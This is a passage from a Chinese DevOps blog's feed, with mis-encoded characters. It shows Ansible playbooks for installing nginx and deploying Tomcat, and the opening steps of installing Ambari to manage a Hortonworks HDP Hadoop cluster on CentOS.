class=&quot;line&quot;&gt;    - name: start httpd service &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      service: name=httpd state=started&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;3-è¿è¡Œplaybookï¼Œä½¿ç”¨ansible-playbookå‘½ä»¤&quot;&gt;&lt;a href=&quot;#3-è¿è¡Œplaybookï¼Œä½¿ç”¨ansible-playbookå‘½ä»¤&quot; class=&quot;headerlink&quot; title=&quot;3.è¿è¡Œplaybookï¼Œä½¿ç”¨ansible-playbookå‘½ä»¤&quot;&gt;&lt;/a&gt;3.è¿è¡Œplaybookï¼Œä½¿ç”¨ansible-playbookå‘½ä»¤&lt;/h3&gt;&lt;p&gt;(1)æ£€æµ‹è¯­æ³•&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ansible-playbook â€“syntax-check /path/to/playbook.yaml&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;(2)æµ‹è¯•è¿è¡Œ&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ansible-playbook -C /path/to/playbook.yaml&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    --list-hosts&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    --list-tasks&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    --list-tags&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¿™é‡Œç®€å•ç»“åˆshellæ¼”å˜å†™å®‰è£…nginx:&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- name: copy nginx package&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  copy: src=nginx-1.10.0-1.el7.ngx.x86_64.rpm dest=/tmp/nginx-1.10.0-1.el7.ngx.x86_64.rpm&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- name: install nginx package&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  yum: name=/tmp/nginx-1.10.0-1.el7.ngx.x86_64.rpm  state=present&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- name: install nginx.conf file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  template: src=nginx.conf.j2 dest=/etc/nginx/nginx.conf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tags: ngxconf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  notify: reload nginx service&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- name: install default.conf file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  template: src=default.conf.j2 dest=/etc/nginx/conf.d/default.conf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tags: ngxconf&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  notify: reload nginx service&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- name: start nginx service&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  service: name=nginx enabled=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt; state=started&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è‡ªåŠ¨åŒ–éƒ¨ç½²TomcatæœåŠ¡ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;---&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- hosts: all&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  environment:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     LC_ALL: zh_CN.UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     LANG : zh_CN.UTF-8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  vars:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#jenkins-æ‰“åŒ…ç›®å½•&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    TESTWAR: /root/java_war/haozhuo-family.war&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ç”Ÿäº§ç¯å¢ƒä¸­é¡¹ç›®çš„tomcatæ‰€åœ¨çš„ä½ç½®&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    OLDHOME: /srv/tomcat/tomcat_family/webapps/ROOT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ç”Ÿäº§ç¯å¢ƒä¸­è€ç‰ˆæœ¬é¡¹ç›®æ‰€åœ¨webappså¤‡ä»½ç›®å½•çš„ä½ç½®&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    backupwebapps: /srv/tomcat/tomcat_family/warbackup&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ä»jenkins-æ‰“åŒ…ç¯å¢ƒè·å–çš„æ–°ç‰ˆæœ¬waråŒ…æ‰€åœ¨çš„ä½ç½®&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    NEWWAR: /root/java_war/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ç”Ÿäº§ç¯å¢ƒä¸­é¡¹ç›®waråŒ…çš„åå­—&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    WARNAME: haozhuo-family.war&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#killæœåŠ¡typeè·¯å¾„&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    DOWNFILE: /srv/tomcat/tomcat_family&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tasks:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: copy-war-file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    copy: src=&amp;#123;&amp;#123; TESTWAR &amp;#125;&amp;#125; dest=&amp;#123;&amp;#123; NEWWAR &amp;#125;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: mkdir-bakwar-file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    file: path=&amp;#123;&amp;#123; backupwebapps &amp;#125;&amp;#125; state=directory owner=tomcat group=tomcat mode=755&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: bakwar-file&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell: &lt;span class=&quot;string&quot;&gt;&quot;cp -r &amp;#123;&amp;#123; OLDHOME &amp;#125;&amp;#125; &amp;#123;&amp;#123; backupwebapps &amp;#125;&amp;#125;&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: unzip war.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    unarchive: src=&amp;#123;&amp;#123; NEWWAR &amp;#125;&amp;#125;/&amp;#123;&amp;#123; WARNAME &amp;#125;&amp;#125; dest=&amp;#123;&amp;#123; OLDHOME &amp;#125;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: stop-tomcat-service&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell: &lt;span class=&quot;string&quot;&gt;&quot;ps -ef |grep &amp;#123;&amp;#123; DOWNFILE &amp;#125;&amp;#125; |grep -v grep |awk &#39;&amp;#123;print &lt;span class=&quot;variable&quot;&gt;$2&lt;/span&gt;&amp;#125;&#39; |xargs kill -9&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    ignore_errors: yes&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    async: 0&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: start-tomcat-service-nohup&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    shell: &lt;span class=&quot;built_in&quot;&gt;chdir&lt;/span&gt;=&amp;#123;&amp;#123; DOWNFILE &amp;#125;&amp;#125;/bin nohup ./startup.sh &amp;amp;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Ansible-å®˜ç½‘å­¦ä¹ ï¼š&quot;&gt;&lt;a href=&quot;#Ansible-å®˜ç½‘å­¦ä¹ ï¼š&quot; class=&quot;headerlink&quot; title=&quot;Ansible å®˜ç½‘å­¦ä¹ ï¼š&quot;&gt;&lt;/a&gt;Ansible å®˜ç½‘å­¦ä¹ ï¼š&lt;/h3&gt;&lt;p&gt;å…è´¹ä¸‹è½½çš„ANSIBLE WHITEPAPER  &lt;
    
    </summary>
    
      <category term="automation" scheme="http://blog.yangcvo.me/categories/automation/"/>
    
    
      <category term="Ansible" scheme="http://blog.yangcvo.me/tags/Ansible/"/>
    
      <category term="Automation" scheme="http://blog.yangcvo.me/tags/Automation/"/>
    
  </entry>
  
  <entry>
    <title>HORTONW0RKSæ•°æ®å¹³å°å®ç°æ­å»ºAmbarié…ç½®å’Œéƒ¨ç½²HDPé›†ç¾¤ç›‘æ§Hadoopé›†ç¾¤</title>
    <link href="http://blog.yangcvo.me/2017/02/08/%E5%A4%A7%E6%95%B0%E6%8D%AEhadoop/HORTONW0RKS%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E5%AE%9E%E7%8E%B0%E6%90%AD%E5%BB%BAAmbari%E9%85%8D%E7%BD%AE%E5%92%8C%E9%83%A8%E7%BD%B2HDP%E9%9B%86%E7%BE%A4%E7%9B%91%E6%8E%A7Hadoop%E9%9B%86%E7%BE%A4%20/"/>
    <id>http://blog.yangcvo.me/2017/02/08/å¤§æ•°æ®hadoop/HORTONW0RKSæ•°æ®å¹³å°å®ç°æ­å»ºAmbarié…ç½®å’Œéƒ¨ç½²HDPé›†ç¾¤ç›‘æ§Hadoopé›†ç¾¤ /</id>
    <published>2017-02-08T09:56:03.000Z</published>
    <updated>2017-03-28T09:42:31.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;HORTONW0RKSæ•°æ®å¹³å°æ­å»ºAmbariç®¡ç†ç›‘æ§Hadoopé›†ç¾¤&quot;&gt;&lt;a href=&quot;#HORTONW0RKSæ•°æ®å¹³å°æ­å»ºAmbariç®¡ç†ç›‘æ§Hadoopé›†ç¾¤&quot; class=&quot;headerlink&quot; title=&quot;HORTONW0RKSæ•°æ®å¹³å°æ­å»ºAmbariç®¡ç†ç›‘æ§Hadoopé›†ç¾¤&quot;&gt;&lt;/a&gt;HORTONW0RKSæ•°æ®å¹³å°æ­å»ºAmbariç®¡ç†ç›‘æ§Hadoopé›†ç¾¤&lt;/h2&gt;&lt;p&gt;&lt;strong&gt; é¢˜å¤–è¯ &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ç°åœ¨åœ¨ä¸€å®¶ä¸Šå¸‚å…¬å¸æ——ä¸‹æ§è‚¡å­å…¬å¸è´Ÿè´£è¿ç»´éƒ¨é—¨ï¼Œè´Ÿè´£ITç½‘ç»œå®‰å…¨åŠå…¬ï¼šä¸»è¦åšçš„åº”ç”¨è¿ç»´å’Œç½‘ç»œè¿ç»´ï¼Œå…¼å¤§æ•°æ®è¿ç»´ã€‚&lt;br&gt;æœ€è¿‘è·Ÿæ–°æ¥çš„æ¶æ„å¸ˆèŠäº†ä¸‹Hadoopç›‘æ§æ–¹é¢ï¼šHORTONW0RKSæ•°æ®å¹³å°æ­å»ºAmbariç›‘æ§Hadoopé›†ç¾¤.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HORTONW0RKSæ•°æ®å¹³å°ï¼ˆHDP Â®ï¼‰&lt;/strong&gt;&lt;br&gt;HDPæ˜¯ä¸šå†…å”¯ä¸€çœŸæ­£å®‰å…¨çš„ä¼ä¸šçº§å¼€æºçš„&lt;code&gt;Apacheçš„Hadoopâ„¢ Â®&lt;/code&gt;åˆ†é…åŸºäºé›†ä¸­å¼æ¶æ„ã€‚HDPè§£å†³äº†é™æ€æ•°æ®çš„å®Œæ•´éœ€æ±‚ï¼Œä¸ºå®æ—¶å®¢æˆ·åº”ç”¨æä¾›æ”¯æŒï¼Œå¹¶æä¾›å¯åŠ é€Ÿå†³ç­–å’Œåˆ›æ–°çš„å¯é åˆ†æã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨Hortonworks Sandboxè¯•ç”¨æœ€æ–°çš„HDPåŠŸèƒ½ï¼Œæˆ–è€…ä¸ºç”Ÿäº§ç¯å¢ƒè®¾ç½®HDPï¼Œå®‰è£…å’Œé…ç½®ç¾¤é›†ã€‚&lt;br&gt;æŸ¥çœ‹å®˜ç½‘æ–‡æ¡£ï¼š&lt;a href=&quot;https://hortonworks.com/downloads/#data-platform&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HORTONWORKS CONNECTED DATA PLATFORMS DOWNLOADS&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1-å°†AmbariæœåŠ¡å­˜å‚¨åº“æ–‡ä»¶ä¸‹è½½åˆ°å®‰è£…ä¸»æœºä¸Šçš„ç›®å½•ã€‚&quot;&gt;&lt;a href=&quot;#1-å°†AmbariæœåŠ¡å­˜å‚¨åº“æ–‡ä»¶ä¸‹è½½åˆ°å®‰è£…ä¸»æœºä¸Šçš„ç›®å½•ã€‚&quot; class=&quot;headerlink&quot; title=&quot;1. å°†AmbariæœåŠ¡å­˜å‚¨åº“æ–‡ä»¶ä¸‹è½½åˆ°å®‰è£…ä¸»æœºä¸Šçš„ç›®å½•ã€‚&quot;&gt;&lt;/a&gt;1. å°†AmbariæœåŠ¡å­˜å‚¨åº“æ–‡ä»¶ä¸‹è½½åˆ°å®‰è£…ä¸»æœºä¸Šçš„ç›®å½•ã€‚&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Centos6.5 &lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;wget -nv http://public-repo-1.hortonworks.com/ambari/centos6/2.x/updates/2.4.2.0/ambari.repo -O /etc/yum.repos.d/ambari.repo&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;âš ï¸è­¦å‘Šï¼šä¸è¦ä¿®æ”¹&lt;code&gt;ambari.repo&lt;/code&gt;æ–‡ä»¶åã€‚åœ¨ä»£ç†æ³¨å†ŒæœŸé—´ï¼Œæ­¤æ–‡ä»¶åº”åœ¨AmbariæœåŠ¡å™¨ä¸»æœºä¸Šå¯ç”¨ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é€šè¿‡æ£€æŸ¥repoåˆ—è¡¨ç¡®è®¤å­˜å‚¨åº“å·²é…ç½®ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;yum repolist&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ‚¨åº”è¯¥åœ¨åˆ—è¡¨ä¸­çœ‹åˆ°ç±»ä¼¼äºä»¥ä¸‹Ambariå­˜å‚¨åº“çš„å€¼ã€‚&lt;/p&gt;
&lt;p&gt;ç‰ˆæœ¬å€¼å› å®‰è£…è€Œå¼‚ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å®‰è£…AmbariæœåŠ¡ã€‚è¿™ä¹Ÿå®‰è£…äº†é»˜è®¤çš„PostgreSQL Ambariæ•°æ®åº“ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;yum install ambari-server&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¾“å…¥&lt;code&gt;y&lt;/code&gt;æç¤ºï¼Œä»¥ç¡®è®¤äº¤æ˜“å’Œä¾èµ–æ€§æ£€æŸ¥æ—¶ã€‚&lt;/p&gt;
&lt;p&gt;æˆåŠŸå®‰è£…å°†æ˜¾ç¤ºç±»ä¼¼äºä»¥ä¸‹å†…å®¹çš„è¾“å‡ºï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;å®‰è£…ï¼špostgresql-libs-8.4.20-3.el6_6.x86_64 1/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å®‰è£…ï¼špostgresql-8.4.20-3.el6_6.x86_64 2/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å®‰è£…ï¼špostgresql-server-8.4.20-3.el6_6.x86_64 3/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å®‰è£…ï¼šambari-server-2.4.2.0-1470.x86_64 4/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;éªŒè¯ï¼šambari-server-2.4.2.0-1470.x86_64 1/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;éªŒè¯ï¼špostgresql-8.4.20-3.el6_6.x86_64 2/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;éªŒè¯ï¼špostgresql-server-8.4.20-3.el6_6.x86_64 3/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;éªŒè¯ï¼špostgresql-libs-8.4.20-3.el6_6.x86_64 4/4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å®‰è£…ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  ambari-server.x86_64 0ï¼š2.4.2.0-1470  å®‰è£…è¿™é‡Œçš„æ—¶å€™ä¼šæœ‰ç‚¹æ…¢ï¼Œå› ä¸ºæ˜¯è®¿é—®å›½å¤–ç½‘ç«™ä¸‹è½½èµ„æºã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å·²å®‰è£…ä¾èµ–å…³ç³»ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; postgresql.x86_64 0ï¼š8.4.20-3.el6_6           &lt;/div&gt;&lt;div class=&quot;line&quot;&gt; postgresql-libs.x86_64 0ï¼š8.4.20-3.el6_6        &lt;/div&gt;&lt;div class=&quot;line&quot;&gt; postgresql-server.x86_64 0ï¼š8.4.20-3.el6_6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;â—ï¸â—ï¸ã€æ³¨æ„ã€‘&lt;/p&gt;
&lt;p&gt;æ¥å—æœ‰å…³ä¿¡ä»»&lt;code&gt;Hortonworks GPG&lt;/code&gt;å¯†é’¥çš„è­¦å‘Šã€‚è¯¥é”®å°†è‡ªåŠ¨ä¸‹è½½å¹¶ç”¨äºéªŒè¯Hortonworksçš„è½¯â€‹â€‹ä»¶åŒ…ã€‚æ‚¨å°†çœ‹åˆ°ä»¥ä¸‹æ¶ˆæ¯ï¼š&lt;/p&gt;
&lt;p&gt;Importing GPG key 0x07513CAD: Userid: â€œJenkins (HDP Builds) &lt;a href=&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#x6a;&amp;#x65;&amp;#110;&amp;#x6b;&amp;#x69;&amp;#110;&amp;#64;&amp;#104;&amp;#111;&amp;#114;&amp;#116;&amp;#111;&amp;#110;&amp;#119;&amp;#111;&amp;#114;&amp;#107;&amp;#x73;&amp;#46;&amp;#99;&amp;#111;&amp;#x6d;&quot;&gt;&amp;#x6a;&amp;#x65;&amp;#110;&amp;#x6b;&amp;#x69;&amp;#110;&amp;#64;&amp;#104;&amp;#111;&amp;#114;&amp;#116;&amp;#111;&amp;#110;&amp;#119;&amp;#111;&amp;#114;&amp;#107;&amp;#x73;&amp;#46;&amp;#99;&amp;#111;&amp;#x6d;&lt;/a&gt;â€œ From :&lt;code&gt;http://s3.amazonaws.com/dev.hortonworks.com/ambari/centos6/RPM-GPG-KEY/RPM-GPG-KEY-Jenkins&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;â—ï¸â—ï¸ã€æ³¨æ„ã€‘&lt;/p&gt;
&lt;p&gt;åœ¨å…·æœ‰æœ‰é™Internetè®¿é—®æˆ–æ²¡æœ‰Internetè®¿é—®çš„ç¾¤é›†ä¸Šéƒ¨ç½²HDPæ—¶ï¼Œåº”ä½¿ç”¨å…¶ä»–æ–¹æ³•æä¾›å¯¹ä½çš„è®¿é—®ã€‚&lt;br&gt;æœ‰å…³è®¾ç½®æœ¬åœ°å­˜å‚¨åº“çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…ä½¿ç”¨æœ¬åœ°å­˜å‚¨åº“ã€‚&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Ambari&lt;/code&gt;æœåŠ¡å™¨é»˜è®¤ä½¿ç”¨åµŒå…¥å¼&lt;code&gt;PostgreSQL&lt;/code&gt;æ•°æ®åº“ã€‚å½“æ‚¨å®‰è£…&lt;code&gt;Ambari&lt;/code&gt;æœåŠ¡å™¨æ—¶ï¼ŒPostgreSQLè½¯ä»¶åŒ…å’Œä¾èµ–å…³ç³»å¿…é¡»å¯ç”¨äºå®‰è£…ã€‚è¿™äº›åŒ…é€šå¸¸ä½œä¸ºæ“ä½œç³»ç»Ÿå­˜å‚¨åº“çš„ä¸€éƒ¨åˆ†æä¾›ã€‚è¯·ç¡®è®¤æ‚¨å…·æœ‰é€‚ç”¨äº&lt;code&gt;postgresql-server&lt;/code&gt;è½¯ä»¶åŒ…çš„ç›¸åº”å­˜å‚¨åº“ã€‚&lt;/p&gt;
